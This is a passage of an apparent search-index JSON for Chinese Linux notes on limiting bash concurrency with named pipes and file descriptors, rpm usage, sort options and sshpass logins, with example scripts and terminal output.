c\u5b8c\u6240\u6709\u540e\u53f0\u547d\u4ee4 end=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u7ed3\u675f\u65f6\u95f4 echo \"TIME:`expr $end - $start`\" \u8fd0\u884c\u7ed3\u679c: [root@iZ94yyzmpgvZ /]# . test1.sh success1 success2 success4 success5 success6 success9 success8 success12 success10 success11 success14 success18 success21 success20 success24 success15 .... success1000 TIME:2 \u4ee3\u7801\u89e3\u6790\u4ee5\u53ca\u95ee\u9898\uff1a shell\u4e2d\u5b9e\u73b0\u5e76\u53d1\uff0c\u5c31\u662f\u628a\u5faa\u73af\u4f53\u7684\u547d\u4ee4\u7528&\u7b26\u53f7\u653e\u5165\u540e\u53f0\u8fd0\u884c\uff0c1000\u4e2a\u4efb\u52a1\u5c31\u4f1a\u5e76\u53d11000\u4e2a\u7ebf\u7a0b,\u8fd0\u884c\u65f6\u95f42s\uff0c\u6bd4\u8d77\u65b9\u6848\u4e00\u76841000s\uff0c\u5df2\u7ecf\u975e\u5e38\u5feb\u4e86\u3002\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\u7ed3\u679csuccess4 ...success3\u5b8c\u5168\u90fd\u662f\u65e0\u5e8f\u7684\uff0c\u56e0\u4e3a\u5927\u5bb6\u90fd\u662f\u540e\u53f0\u8fd0\u884c\u7684\uff0c\u8fd9\u65f6\u5019\u5c31\u662fcpu\u968f\u673a\u8fd0\u884c\u4e86\uff0c\u6240\u4ee5\u5e76\u6ca1\u6709\u4ec0\u4e48\u987a\u5e8f\u3002\u8fd9\u6837\u5199\u786e\u5b9e\u53ef\u4ee5\u5b9e\u73b0\u5e76\u53d1\uff0c\u7136\u540e\uff0c\u5927\u5bb6\u53ef\u4ee5\u60f3\u8c61\u4e00\u4e0b\uff0c1000\u4e2a\u4efb\u52a1\u5c31\u8981\u5e76\u53d11000\u4e2a\u7ebf\u7a0b\uff0c\u8fd9\u6837\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u9020\u6210\u7684\u538b\u529b\u975e\u5e38\u5927\uff0c\u5b83\u4f1a\u968f\u7740\u5e76\u53d1\u4efb\u52a1\u6570\u7684\u589e\u591a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5904\u7406\u901f\u5ea6\u4f1a\u53d8\u6162\u751a\u81f3\u51fa\u73b0\u5176\u4ed6\u4e0d\u7a33\u5b9a\u56e0\u7d20\uff0c\u5c31\u597d\u6bd4\u4f60\u5728\u5bf9nginx\u8c03\u4f18\u540e\uff0c\u4f60\u8ba4\u4e3a\u4f60\u7684nginx\u7406\u8bba\u4e0a\u6700\u5927\u53ef\u4ee5\u652f\u63011w\u5e76\u53d1\u4e86\uff0c\u5b9e\u9645\u4e0a\u5462\uff0c\u4f60\u7684\u7cfb\u7edf\u4f1a\u968f\u7740\u9ad8\u5e76\u53d1\u538b\u529b\u4f1a\u4e0d\u65ad\u6500\u5347\uff0c\u5904\u7406\u901f\u5ea6\u4f1a\u8d8a\u6765\u8d8a\u6162\u3002","title":"\u65b9\u6848\u4e8c"},{"location":"programming_language/bash_help/mkfifo/#_4","text":"\u601d\u8def\uff1a\u57fa\u4e8e\u65b9\u6848\u4e8c\uff0c\u4f7f\u7528linux\u7ba1\u9053\u6587\u4ef6\u7279\u6027\u5236\u4f5c\u961f\u5217\uff0c\u63a7\u5236\u7ebf\u7a0b\u6570\u76ee \u77e5\u8bc6\u50a8\u5907\uff1a","title":"\u65b9\u6848\u4e09"},{"location":"programming_language/bash_help/mkfifo/#_5","text":"\u65e0\u540d\u7ba1\u9053\uff08ps aux | grep nginx\uff09 \u6709\u540d\u7ba1\u9053\uff08mkfifo /tmp/fd1\uff09 \u6709\u540d\u7ba1\u9053\u7279\u6027\uff1a 1.cat /tmp/fd1 (\u5982\u679c\u7ba1\u9053\u5185\u5bb9\u4e3a\u7a7a\uff0c\u5219\u963b\u585e) 2.echo \"test\" > /tmp/fd1 (\u5982\u679c\u6ca1\u6709\u8bfb\u7ba1\u9053\u7684\u64cd\u4f5c\uff0c\u5219\u963b\u585e) \u5b9e\u9a8c1\uff1a [root@VM-0-2-centos ~]# mkfifo /tmp/fd1 [root@VM-0-2-centos ~]# ll /tmp/fd1 prw-r--r-- 1 root root 0 Apr 16 13:01 /tmp/fd1 \u7ec8\u7aef1 [root@VM-0-2-centos ~]# cat /tmp/fd1 #\u963b\u585e \u7ec8\u7aef2 [root@VM-0-2-centos ~]# echo 'test1' >/tmp/fd1 [root@VM-0-2-centos ~] \u7ec8\u7aef1 [root@VM-0-2-centos ~]# cat /tmp/fd1 test1 \u6b64\u65f6\u7ec8\u7aef1\u91cc\u9762\u7684\u7ba1\u9053\u4e0d\u518d\u963b\u585e \u5b9e\u9a8c2\uff1a [root@VM-0-2-centos ~]# mkfifo /tmp/fd1 [root@VM-0-2-centos ~]# ll /tmp/fd1 prw-r--r-- 1 root root 0 Apr 16 13:01 /tmp/fd1 \u7ec8\u7aef1 [root@VM-0-2-centos ~]# echo 'test2' >/tmp/fd1 #\u963b\u585e \u7ec8\u7aef2 [root@VM-0-2-centos ~]# cat /tmp/fd1 test2 \u7ec8\u7aef1 [root@VM-0-2-centos ~]# echo 'test2' >/tmp/fd1 [root@VM-0-2-centos ~]# \u6b64\u65f6\u7ec8\u7aef1\u91cc\u9762\u7684\u7ba1\u9053\u4e0d\u518d\u963b\u585e \u603b\u7ed3\uff1a \u5229\u7528\u6709\u540d\u7ba1\u9053\u7684\u4e0a\u8ff0\u7279\u6027\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u961f\u5217\u63a7\u5236\u4e86 \u200b \u4f60\u53ef\u4ee5\u8fd9\u6837\u60f3\uff1a\u4e00\u4e2a\u5973\u58eb\u516c\u5171\u5395\u6240\u603b\u5171\u5c3110\u4e2a\u8e72\u4f4d\uff0c\u8fd9\u4e2a\u8e72\u4f4d\u5c31\u662f\u961f\u5217\u957f\u5ea6\uff0c\u5973\u5395\u6240\u95e8\u53e3\u653e\u774010\u628a\u836f\u5319\uff0c\u8981\u60f3\u4e0a\u5395\u6240\u5fc5\u987b\u62ff\u4e00\u628a\u836f\u5319\uff0c\u4e0a\u5b8c\u5395\u6240\u540e\u5f52\u8fd8\u836f\u5319\uff0c\u4e0b\u4e00\u4e2a\u4eba\u5c31\u53ef\u4ee5\u62ff\u836f\u5319\u8fdb\u53bb\u4e0a\u5395\u6240\u4e86\uff0c\u8fd9\u6837\u540c\u65f6\u6765\u4e861\u5343\u4f4d\u7f8e\u5973\u4e0a\u5395\u6240\uff0c\u90a3\u524d\u5341\u4e2a\u4eba\u62a2\u5230\u836f\u5319\u8fdb\u53bb\u4e0a\u5395\u6240\u4e86\uff0c\u540e\u9762\u7684990\u4eba\u9700\u8981\u7b49\u4e00\u4e2a\u4eba\u51fa\u6765\u5f52\u8fd8\u836f\u5319\u624d\u53ef\u4ee5\u62ff\u5230\u836f\u5319\u8fdb\u53bb\u4e0a\u5395\u6240\uff0c\u8fd9\u683710\u628a\u836f\u5319\u5c31\u5b9e\u73b0\u4e86\u63a7\u52361000\u4eba\u4e0a\u5395\u6240\u7684\u4efb\u52a1\uff08os\u4e2d\u79f0\u4e4b\u4e3a\u4fe1\u53f7\u91cf\uff09","title":"\u4e00.\u7ba1\u9053\u6587\u4ef6"},{"location":"programming_language/bash_help/mkfifo/#_6","text":"\u7ba1\u9053\u5177\u6709\u5b58\u4e00\u4e2a\u8bfb\u4e00\u4e2a\uff0c\u8bfb\u5b8c\u4e00\u4e2a\u5c31\u5c11\u4e00\u4e2a\uff0c\u6ca1\u6709\u5219\u963b\u585e\uff0c\u653e\u56de\u7684\u53ef\u4ee5\u91cd\u590d\u53d6\uff0c\u8fd9\u6b63\u662f\u961f\u5217\u7279\u6027\uff0c\u4f46\u662f\u95ee\u9898\u662f\u5f53\u5f80\u7ba1\u9053\u6587\u4ef6\u91cc\u9762\u653e\u5165\u4e00\u6bb5\u5185\u5bb9\uff0c\u6ca1\u4eba\u53d6\u5219\u4f1a\u963b\u585e\uff0c\u8fd9\u6837\u4f60\u6c38\u8fdc\u4e5f\u6ca1\u529e\u6cd5\u5f80\u7ba1\u9053\u91cc\u9762\u540c\u65f6\u653e\u516510\u6bb5\u5185\u5bb9\uff08\u60f3\u5f53\u4e0e10\u628a\u836f\u5319\uff09\uff0c\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e86\u3002 mkfifo /tmp/fd1\uff0c\u521b\u5efa\u6709\u540d\u7ba1\u9053\u6587\u4ef6exec 3<>/tmp/fd1\uff0c\u521b\u5efa\u6587\u4ef6\u63cf\u8ff0\u7b263\u5173\u8054\u7ba1\u9053\u6587\u4ef6\uff0c\u8fd9\u65f6\u50193\u8fd9\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u5c31\u62e5\u6709\u4e86\u7ba1\u9053\u7684\u6240\u6709\u7279\u6027\uff0c\u8fd8\u5177\u6709\u4e00\u4e2a\u7ba1\u9053\u4e0d\u5177\u6709\u7684\u7279\u6027\uff1a\u65e0\u9650\u5b58\u4e0d\u963b\u585e\uff0c\u65e0\u9650\u53d6\u4e0d\u963b\u585e\uff0c\u800c\u4e0d\u7528\u5173\u5fc3\u7ba1\u9053\u5185\u662f\u5426\u4e3a\u7a7a\uff0c\u4e5f\u4e0d\u7528\u5173\u5fc3\u662f\u5426\u6709\u5185\u5bb9\u5199\u5165\u5f15\u7528\u6587\u4ef6\u63cf\u8ff0\u7b26\uff1a &3\u53ef\u4ee5\u6267\u884cn\u6b21echo >&3 \u5f80\u7ba1\u9053\u91cc\u653e\u5165n\u628a\u94a5\u5319 \u5b9e\u73b0\uff1a #!/bin/bash start_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u5f00\u59cb\u65f6\u95f4 [ -e /tmp/fd1 ] || mkfifo /tmp/fd1 #\u521b\u5efa\u6709\u540d\u7ba1\u9053 exec 3<>/tmp/fd1 #\u521b\u5efa\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4ee5\u53ef\u8bfb\uff08<\uff09\u53ef\u5199\uff08>\uff09\u7684\u65b9\u5f0f\u5173\u8054\u7ba1\u9053\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u6587\u4ef6\u63cf\u8ff0\u7b263\u5c31\u6709\u4e86\u6709\u540d\u7ba1\u9053\u6587\u4ef6\u7684\u6240\u6709\u7279\u6027 rm -rf /tmp/fd1 #\u5173\u8054\u540e\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u62e5\u6709\u7ba1\u9053\u6587\u4ef6\u7684\u6240\u6709\u7279\u6027,\u6240\u4ee5\u8fd9\u65f6\u5019\u7ba1\u9053\u6587\u4ef6\u53ef\u4ee5\u5220\u9664\uff0c\u6211\u4eec\u7559\u4e0b\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u7528\u5c31\u53ef\u4ee5\u4e86 for ((i=1;i<=10;i++)) do echo >&3 #&3\u4ee3\u8868\u5f15\u7528\u6587\u4ef6\u63cf\u8ff0\u7b263\uff0c\u8fd9\u6761\u547d\u4ee4\u4ee3\u8868\u5f80\u7ba1\u9053\u91cc\u9762\u653e\u5165\u4e86\u4e00\u4e2a\"\u4ee4\u724c\" done for ((i=1;i<=1000;i++)) do read -u3 #\u4ee3\u8868\u4ece\u7ba1\u9053\u4e2d\u8bfb\u53d6\u4e00\u4e2a\u4ee4\u724c { sleep 1 #sleep 1\u7528\u6765\u6a21\u4eff\u6267\u884c\u4e00\u6761\u547d\u4ee4\u9700\u8981\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u53ef\u4ee5\u7528\u771f\u5b9e\u547d\u4ee4\u6765\u4ee3\u66ff\uff09 echo 'success'$i echo >&3 #\u4ee3\u8868\u6211\u8fd9\u4e00\u6b21\u547d\u4ee4\u6267\u884c\u5230\u6700\u540e\uff0c\u628a\u4ee4\u724c\u653e\u56de\u7ba1\u9053 }& done wait stop_time=`date +%s` #\u5b9a\u4e49\u811a\u672c\u8fd0\u884c\u7684\u7ed3\u675f\u65f6\u95f4 echo \"TIME:`expr $stop_time - $start_time`\" exec 3<&- #\u5173\u95ed\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u8bfb exec 3>&- #\u5173\u95ed\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u5199 \u8fd0\u884c\u7ed3\u679c\uff1a [root@iZ94yyzmpgvZ /]# . test2.sh success4 success6 success7 success8 success9 success5 ...... success935 TIME:101 \u4ee3\u7801\u89e3\u6790\u4ee5\u53ca\u95ee\u9898\uff1a \u4e24\u4e2afor\u5faa\u73af\uff0c\u7b2c\u4e00\u4e2afor\u5faa\u73af10\u6b21\uff0c\u76f8\u5f53\u4e8e\u5728\u5973\u58eb\u516c\u5171\u5395\u6240\u95e8\u53e3\u653e\u4e8610\u628a\u94a5\u5319\uff0c\u7b2c\u4e8c\u4e2afor\u5faa\u73af1000\u6b21\uff0c\u76f8\u5f53\u4e8e1000\u4e2a\u4eba\u6765\u4e0a\u5395\u6240\uff0cread -u3\u76f8\u5f53\u4e8e\u53d6\u8d70\u4e00\u628a\u836f\u5319\uff0c{}\u91cc\u9762\u6700\u540e\u4e00\u884c\u4ee3\u7801echo >&3\u76f8\u5f53\u4e8e\u4e0a\u5b8c\u5395\u6240\u9001\u8fd8\u836f\u5319\u3002\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e8610\u628a\u836f\u5319\u63a7\u52361000\u4e2a\u4efb\u52a1\u7684\u8fd0\u884c\uff0c\u8fd0\u884c\u65f6\u95f4\u4e3a101s\uff0c\u80af\u5b9a\u4e0d\u5982\u65b9\u6848\u4e8c\u5feb\uff0c\u4f46\u662f\u6bd4\u65b9\u6848\u4e00\u5df2\u7ecf\u5feb\u5f88\u591a\u4e86\uff0c\u8fd9\u5c31\u662f\u961f\u5217\u63a7\u5236\u540c\u4e00\u65f6\u95f4\u53ea\u6709\u6700\u591a10\u4e2a\u7ebf\u7a0b\u7684\u5e76\u53d1\uff0c\u65e2\u63d0\u9ad8\u4e86\u6548\u7387\uff0c\u53c8\u5b9e\u73b0\u4e86\u5e76\u53d1\u63a7\u5236\u3002 \u6ce8\u610f\uff1a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26 exec 3<>/tmp/fd1 \u4e0d\u80fd\u6709\u7a7a\u683c\uff0c\u4ee3\u8868\u6587\u4ef6\u63cf\u8ff0\u7b263\u6709\u53ef\u8bfb\uff08<\uff09\u53ef\u5199\uff08>\uff09\u6743\u9650\uff0c\u6ce8\u610f\uff0c\u6253\u5f00\u7684\u65f6\u5019\u53ef\u4ee5\u5199\u5728\u4e00\u8d77\uff0c\u5173\u95ed\u7684\u65f6\u5019\u5fc5\u987b\u5206\u5f00\u5173\uff0cexec 3<&-\u5173\u95ed\u8bfb\uff0cexec 3>&-\u5173\u95ed\u5199","title":"\u4e8c.\u6587\u4ef6\u63cf\u8ff0\u7b26"},{"location":"programming_language/bash_help/rpm/","text":"Rpm rpm\u547d\u4ee4\u662fRed-Hat Package Manager\uff08RPM\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\uff09\u7684\u7f29\u5199\uff0c \u8be5\u547d\u4ee4\u7528\u4e8e\u7ba1\u7406Linux \u4e0b\u8f6f\u4ef6\u5305\u7684\u8f6f\u4ef6\u3002\u5728 Linux \u64cd\u4f5c\u7cfb\u7edf\u4e0b\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u8f6f\u4ef6\u5747\u53ef\u4ee5\u901a\u8fc7RPM \u8fdb\u884c\u5b89\u88c5\u3001\u5378\u8f7d\u53ca\u7ba1\u7406\u7b49\u64cd\u4f5c\u3002 \u6982\u62ec\u7684\u8bf4\uff0crpm\u547d\u4ee4\u5305\u542b\u4e86\u4e94\u79cd\u57fa\u672c\u529f\u80fd\uff1a\u5b89\u88c5\u3001\u5378\u8f7d\u3001\u5347\u7ea7\u3001\u67e5\u8be2\u548c\u9a8c\u8bc1\u3002 \u8bed\u6cd5 \u8bed\u6cd5\u683c\u5f0f\uff1a rpm [\u53c2\u6570] [\u8f6f\u4ef6\u5305] \u5e38\u7528\u53c2\u6570\uff1a -a \u67e5\u8be2\u6240\u6709\u7684\u8f6f\u4ef6\u5305 -b\u6216-t \u8bbe\u7f6e\u5305\u88c5\u5957\u4ef6\u7684\u5b8c\u6210\u9636\u6bb5\uff0c\u5e76\u6307\u5b9a\u5957\u4ef6\u6863\u7684\u6587\u4ef6\u540d\u79f0\uff1b -c \u53ea\u5217\u51fa\u7ec4\u6001\u914d\u7f6e\u6587\u4ef6\uff0c\u672c\u53c2\u6570\u9700\u914d\u5408\u201d-l\u201d\u53c2\u6570\u4f7f\u7528 -d \u53ea\u5217\u51fa\u6587\u672c\u6587\u4ef6\uff0c\u672c\u53c2\u6570\u9700\u914d\u5408\u201d-l\u201d\u53c2\u6570\u4f7f\u7528 -e\u6216--erase \u5378\u8f7d\u8f6f\u4ef6\u5305 -f \u67e5\u8be2\u6587\u4ef6\u6216\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 -h\u6216--hash \u5b89\u88c5\u8f6f\u4ef6\u5305\u65f6\u5217\u51fa\u6807\u8bb0 -i \u663e\u793a\u8f6f\u4ef6\u5305\u7684\u76f8\u5173\u4fe1\u606f --install \u5b89\u88c5\u8f6f\u4ef6\u5305 -l \u663e\u793a\u8f6f\u4ef6\u5305\u7684\u6587\u4ef6\u5217\u8868 -p \u67e5\u8be2\u6307\u5b9a\u7684rpm\u8f6f\u4ef6\u5305 -q \u67e5\u8be2\u8f6f\u4ef6\u5305 -R \u663e\u793a\u8f6f\u4ef6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb -s \u663e\u793a\u6587\u4ef6\u72b6\u6001\uff0c\u672c\u53c2\u6570\u9700\u914d\u5408\u201d-l\u201d\u53c2\u6570\u4f7f\u7528 -U\u6216--upgrade \u5347\u7ea7\u8f6f\u4ef6\u5305 -v \u663e\u793a\u547d\u4ee4\u6267\u884c\u8fc7\u7a0b -vv \u8be6\u7ec6\u663e\u793a\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b \u53c2\u8003\u5b9e\u4f8b \u76f4\u63a5\u5b89\u88c5\u8f6f\u4ef6\u5305\uff1a [root@linuxcool ~]# rpm -ivh packge.rpm \u5ffd\u7565\u62a5\u9519\uff0c\u5f3a\u5236\u5b89\u88c5\uff1a [root@linuxcool ~]# rpm --force -ivh package.rpm \u5217\u51fa\u6240\u6709\u5b89\u88c5\u8fc7\u7684\u5305\uff1a [root@linuxcool ~]# rpm -qa \u67e5\u8be2rpm\u5305\u4e2d\u7684\u6587\u4ef6\u5b89\u88c5\u7684\u4f4d\u7f6e\uff1a [root@linuxcool ~]# rpm -ql ls \u5378\u8f7drpm\u5305\uff1a [root@linuxcool ~]# rpm -e package.rpm \u5347\u7ea7\u8f6f\u4ef6\u5305\uff1a [root@linuxcool ~]# rpm -U file.rpm \u67e5\u770b\u7cfb\u7edf\u8f6f\u4ef6\u53d8\u5316 for p in $(rpm -qa); do rpm --verify $p || echo $p;done S= \u5927\u5c0f\u6539\u53d8 M= \u6743\u9650\u6539\u53d8 5=MD5\u6539\u53d8\uff0c\u8bf4\u660e\u6587\u4ef6\u5185\u5bb9\u88ab\u6539\u4e86 \uff1a md5sum L= \u8fde\u63a5\u6539\u53d8 D= \u8bbe\u5907\u6539\u53d8 U=\u7528\u6237\u6539\u53d8 G= \u7ec4\u6539\u53d8 T=\u4fee\u6539\u65f6\u95f4\u6539","title":"\u67e5\u770b\u7cfb\u7edf\u8f6f\u4ef6\u53d8\u5316"},{"location":"programming_language/bash_help/rpm/#rpm","text":"rpm\u547d\u4ee4\u662fRed-Hat Package Manager\uff08RPM\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\uff09\u7684\u7f29\u5199\uff0c \u8be5\u547d\u4ee4\u7528\u4e8e\u7ba1\u7406Linux \u4e0b\u8f6f\u4ef6\u5305\u7684\u8f6f\u4ef6\u3002\u5728 Linux \u64cd\u4f5c\u7cfb\u7edf\u4e0b\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u8f6f\u4ef6\u5747\u53ef\u4ee5\u901a\u8fc7RPM \u8fdb\u884c\u5b89\u88c5\u3001\u5378\u8f7d\u53ca\u7ba1\u7406\u7b49\u64cd\u4f5c\u3002 \u6982\u62ec\u7684\u8bf4\uff0crpm\u547d\u4ee4\u5305\u542b\u4e86\u4e94\u79cd\u57fa\u672c\u529f\u80fd\uff1a\u5b89\u88c5\u3001\u5378\u8f7d\u3001\u5347\u7ea7\u3001\u67e5\u8be2\u548c\u9a8c\u8bc1\u3002","title":"Rpm"},{"location":"programming_language/bash_help/rpm/#_1","text":"\u8bed\u6cd5\u683c\u5f0f\uff1a rpm [\u53c2\u6570] [\u8f6f\u4ef6\u5305] \u5e38\u7528\u53c2\u6570\uff1a -a \u67e5\u8be2\u6240\u6709\u7684\u8f6f\u4ef6\u5305 -b\u6216-t \u8bbe\u7f6e\u5305\u88c5\u5957\u4ef6\u7684\u5b8c\u6210\u9636\u6bb5\uff0c\u5e76\u6307\u5b9a\u5957\u4ef6\u6863\u7684\u6587\u4ef6\u540d\u79f0\uff1b -c \u53ea\u5217\u51fa\u7ec4\u6001\u914d\u7f6e\u6587\u4ef6\uff0c\u672c\u53c2\u6570\u9700\u914d\u5408\u201d-l\u201d\u53c2\u6570\u4f7f\u7528 -d \u53ea\u5217\u51fa\u6587\u672c\u6587\u4ef6\uff0c\u672c\u53c2\u6570\u9700\u914d\u5408\u201d-l\u201d\u53c2\u6570\u4f7f\u7528 -e\u6216--erase \u5378\u8f7d\u8f6f\u4ef6\u5305 -f \u67e5\u8be2\u6587\u4ef6\u6216\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 -h\u6216--hash \u5b89\u88c5\u8f6f\u4ef6\u5305\u65f6\u5217\u51fa\u6807\u8bb0 -i \u663e\u793a\u8f6f\u4ef6\u5305\u7684\u76f8\u5173\u4fe1\u606f --install \u5b89\u88c5\u8f6f\u4ef6\u5305 -l \u663e\u793a\u8f6f\u4ef6\u5305\u7684\u6587\u4ef6\u5217\u8868 -p \u67e5\u8be2\u6307\u5b9a\u7684rpm\u8f6f\u4ef6\u5305 -q \u67e5\u8be2\u8f6f\u4ef6\u5305 -R \u663e\u793a\u8f6f\u4ef6\u5305\u7684\u4f9d\u8d56\u5173\u7cfb -s \u663e\u793a\u6587\u4ef6\u72b6\u6001\uff0c\u672c\u53c2\u6570\u9700\u914d\u5408\u201d-l\u201d\u53c2\u6570\u4f7f\u7528 -U\u6216--upgrade \u5347\u7ea7\u8f6f\u4ef6\u5305 -v \u663e\u793a\u547d\u4ee4\u6267\u884c\u8fc7\u7a0b -vv \u8be6\u7ec6\u663e\u793a\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b \u53c2\u8003\u5b9e\u4f8b \u76f4\u63a5\u5b89\u88c5\u8f6f\u4ef6\u5305\uff1a [root@linuxcool ~]# rpm -ivh packge.rpm \u5ffd\u7565\u62a5\u9519\uff0c\u5f3a\u5236\u5b89\u88c5\uff1a [root@linuxcool ~]# rpm --force -ivh package.rpm \u5217\u51fa\u6240\u6709\u5b89\u88c5\u8fc7\u7684\u5305\uff1a [root@linuxcool ~]# rpm -qa \u67e5\u8be2rpm\u5305\u4e2d\u7684\u6587\u4ef6\u5b89\u88c5\u7684\u4f4d\u7f6e\uff1a [root@linuxcool ~]# rpm -ql ls \u5378\u8f7drpm\u5305\uff1a [root@linuxcool ~]# rpm -e package.rpm \u5347\u7ea7\u8f6f\u4ef6\u5305\uff1a [root@linuxcool ~]# rpm -U file.rpm","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/rpm/#_2","text":"for p in $(rpm -qa); do rpm --verify $p || echo $p;done S= \u5927\u5c0f\u6539\u53d8 M= \u6743\u9650\u6539\u53d8 5=MD5\u6539\u53d8\uff0c\u8bf4\u660e\u6587\u4ef6\u5185\u5bb9\u88ab\u6539\u4e86 \uff1a md5sum L= \u8fde\u63a5\u6539\u53d8 D= \u8bbe\u5907\u6539\u53d8 U=\u7528\u6237\u6539\u53d8 G= \u7ec4\u6539\u53d8 T=\u4fee\u6539\u65f6\u95f4\u6539","title":"\u67e5\u770b\u7cfb\u7edf\u8f6f\u4ef6\u53d8\u5316"},{"location":"programming_language/bash_help/sort/","text":"sort\u547d\u4ee4 \u51e0\u4e2a\u6bd4\u8f83\u5173\u952e\u7684\u9009\u9879 -k \u662f\u6309\u7167\u54ea\u5217\u53bb\u6392\u5e8f -h\u662f\u6839\u636e\u5b58\u50a8\u5bb9\u91cf\u6392\u5e8f(\u6ce8\u610f\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1a2K 1G)\u3002 -r \u9006\u5e8f\u8f93\u51fa\u6392\u5e8f\u7ed3\u679c -n, --numeric-sort \u6839\u636e\u5b57\u7b26\u4e32\u6570\u503c\u6bd4\u8f83 \u4f8b\u5982\uff1a \u6253\u5370\u7ebf\u7a0b\u5360\u7528CPU\u6392\u5e8f [root@VM-0-16-centos /]# ps -Leo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:30,comm | grep -v COMMAND | sort -k8nr 11361 11364 TS - 0 19 0 0.2 Sl futex_wait_queue_me YDService 11361 11367 TS - 0 19 0 0.2 Sl futex_wait_queue_me YDService 11361 11399 TS - 0 19 0 0.1 Sl futex_wait_queue_me YDService 11361 31430 TS - 0 19 1 0.1 Sl ep_poll YDService \u67e5\u770b\u7cfb\u7edf\u4e2d\u5927\u76ee\u5f55\u5e76\u6392\u5e8f [root@www /] #du -h / 2>/dev/null| sort -k1rh | head -n 20 191G / 171G /dev 170G /dev/sdfsd 7.9G /var 5.6G /sdfsdfsdfsd \u5728\u7ebfman\u624b\u518c sort linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) find(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages","title":"sort\u6392\u5e8f"},{"location":"programming_language/bash_help/sort/#sort","text":"","title":"sort\u547d\u4ee4"},{"location":"programming_language/bash_help/sort/#_1","text":"-k \u662f\u6309\u7167\u54ea\u5217\u53bb\u6392\u5e8f -h\u662f\u6839\u636e\u5b58\u50a8\u5bb9\u91cf\u6392\u5e8f(\u6ce8\u610f\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1a2K 1G)\u3002 -r \u9006\u5e8f\u8f93\u51fa\u6392\u5e8f\u7ed3\u679c -n, --numeric-sort \u6839\u636e\u5b57\u7b26\u4e32\u6570\u503c\u6bd4\u8f83 \u4f8b\u5982\uff1a \u6253\u5370\u7ebf\u7a0b\u5360\u7528CPU\u6392\u5e8f [root@VM-0-16-centos /]# ps -Leo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:30,comm | grep -v COMMAND | sort -k8nr 11361 11364 TS - 0 19 0 0.2 Sl futex_wait_queue_me YDService 11361 11367 TS - 0 19 0 0.2 Sl futex_wait_queue_me YDService 11361 11399 TS - 0 19 0 0.1 Sl futex_wait_queue_me YDService 11361 31430 TS - 0 19 1 0.1 Sl ep_poll YDService \u67e5\u770b\u7cfb\u7edf\u4e2d\u5927\u76ee\u5f55\u5e76\u6392\u5e8f [root@www /] #du -h / 2>/dev/null| sort -k1rh | head -n 20 191G / 171G /dev 170G /dev/sdfsd 7.9G /var 5.6G /sdfsdfsdfsd \u5728\u7ebfman\u624b\u518c sort linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) find(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages","title":"\u51e0\u4e2a\u6bd4\u8f83\u5173\u952e\u7684\u9009\u9879"},{"location":"programming_language/bash_help/sshpass/","text":"Sshpass sshpass\u547d\u4ee4\u7528\u4e8e\u975e\u4ea4\u4e92\u7684 ssh \u5bc6\u7801\u9a8c\u8bc1\u3002\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u76f4\u63a5\u4f7f\u7528\u5bc6\u7801\u6765\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u548c\u8fdc\u7a0b\u62c9\u53d6\u6587\u4ef6\u3002\u4f7f\u7528\u524d\u63d0\uff1a\u5bf9\u4e8e\u672a\u8fde\u63a5\u8fc7\u7684\u4e3b\u673a\u3002\u800c\u53c8\u4e0d\u8f93\u5165yes\u8fdb\u884c\u786e\u8ba4\uff0c\u9700\u8981\u8fdb\u884csshd\u670d\u52a1\u7684\u4f18\u5316\u3002 \u8bed\u6cd5 \u8bed\u6cd5\u683c\u5f0f\uff1a sshpass [\u53c2\u6570] \u5e38\u7528\u53c2\u6570\uff1a -p \u6307\u5b9a\u5bc6\u7801 -f \u6307\u5b9a\u6587\u4ef6 \u53c2\u8003\u5b9e\u4f8b \u5b89\u88c5sshpass\uff1a [root@linuxcool ~]# yum install -y epel-release [root@linuxcool ~]# yum install -y sshpass [root@linuxcool ~]# sshpass -V \u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\uff1a [root@linuxcool ~]# sshpass -p \"password\" ssh username@ip \u5f53\u8fdc\u7a0b\u4e3b\u673a\u7aef\u53e3\u4e0d\u518d\u662f22\u9ed8\u8ba4\u7aef\u53e3\u65f6\u5019\uff1a [root@linuxcool ~]# sshpass -p \"password\" ssh -p 8443 username@ip 